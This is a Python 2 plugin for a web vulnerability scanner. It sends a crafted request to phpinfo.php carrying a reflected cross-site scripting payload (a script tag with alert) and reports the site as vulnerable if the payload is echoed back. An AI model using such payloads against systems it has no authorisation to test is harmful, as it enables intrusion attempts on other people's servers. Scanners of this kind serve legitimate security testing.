#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"phpinfo.php?cx[]=JUNK(4096)<script>alert(111)</script>")
        res, content = requestUrl(http,expurl,ob['task_id'],ob['domain_id'])
        if res['status'] != '404' and content.find('<script>alert(111)</script>"')>=0:
            request = getRequest(expurl)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:phpinfo_cx_xssscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:phpinfo_cx_xssscript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def